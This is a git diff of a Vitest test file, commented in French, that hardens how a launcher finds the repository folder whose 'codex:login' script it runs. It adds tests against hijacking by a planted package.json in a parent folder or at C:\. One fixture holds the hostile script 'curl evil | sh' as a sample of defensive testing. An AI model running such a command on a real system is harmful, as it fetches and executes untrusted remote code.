@@ -2,6 +2,7 @@ import { describe, expect, it, vi } from 'vitest'
 import { readFileSync } from 'node:fs'
 import { join } from 'node:path'
 import {
+  AUTOWIN_PACKAGE_NAME,
   planPreflightRepair,
   repairPreflightCheck,
   resolveCodexLoginCwd
@@ -109,7 +110,10 @@ describe('repairPreflightCheck — ce qui est LANCÉ, jamais « réparé »', ()
 describe('resolveCodexLoginCwd — on cherche le repo, on ne le suppose pas', () => {
   const repo = join('/repo', 'autowin')
   const pkg = (dir: string): string => join(dir, 'package.json')
-  const manifest = (scripts: Record<string, string>): string => JSON.stringify({ scripts })
+  // Un manifeste ne compte que s'il a l'IDENTITÉ du dépôt : `name` + le script. Le nom seul ne
+  // suffit pas, le script seul non plus (cf. les tests de détournement ci-dessous).
+  const manifest = (scripts: Record<string, string>, name = AUTOWIN_PACKAGE_NAME): string =>
+    JSON.stringify({ name, scripts })
   const declaring = manifest({ 'codex:login': 'tsx scripts/codex-login.mjs' })
 
   it('trouve le dossier qui DECLARE le script', () => {
@@ -162,6 +166,45 @@ describe('resolveCodexLoginCwd — on cherche le repo, on ne le suppose pas', ()
 
   it('candidat vide ignore (variable d’environnement non definie)', () => {
     expect(resolveCodexLoginCwd([''], () => true, () => declaring)).toBeUndefined()
+  })
+
+  /**
+   * DÉTOURNEMENT — le dossier élu est ensuite exécuté (`npm run codex:login`, via
+   * `powershell -ExecutionPolicy Bypass`). « Ce dossier déclare le script » n'est donc PAS une preuve
+   * d'identité : la remontée des parents finit par atteindre `C:\`, dont la racine autorise par défaut
+   * la création de fichiers aux utilisateurs authentifiés.
+   */
+  it('un package.json ÉTRANGER déclarant le script dans un parent n’est PAS élu', () => {
+    const parent = '/repo'
+    const hostile = manifest({ 'codex:login': 'curl evil | sh' }, 'pas-autowin')
+    expect(
+      resolveCodexLoginCwd([join(parent, 'ailleurs')], (p) => p === pkg(parent), () => hostile)
+    ).toBeUndefined()
+  })
+
+  it('un C:\\package.json planté à la RACINE n’est jamais inspecté', () => {
+    const seen: string[] = []
+    expect(
+      resolveCodexLoginCwd(
+        ['C:\\Program Files\\Autowin OS'],
+        (p) => {
+          seen.push(p)
+          return p === 'C:\\package.json'
+        },
+        () => declaring
+      )
+    ).toBeUndefined()
+    expect(seen).not.toContain('C:\\package.json')
+  })
+
+  it('un candidat RELATIF est refusé (il se résoudrait depuis le cwd du process)', () => {
+    expect(resolveCodexLoginCwd(['.'], () => true, () => declaring)).toBeUndefined()
+    expect(resolveCodexLoginCwd(['sous-dossier'], () => true, () => declaring)).toBeUndefined()
+  })
+
+  it('SUR CE POSTE : le repo réel est bien élu depuis le cwd', () => {
+    // Garde anti-regression : si l'identite exigee ne matche plus, le bouton « Se connecter » meurt.
+    expect(resolveCodexLoginCwd([process.cwd()])).toBe(process.cwd())
   })
 })
 
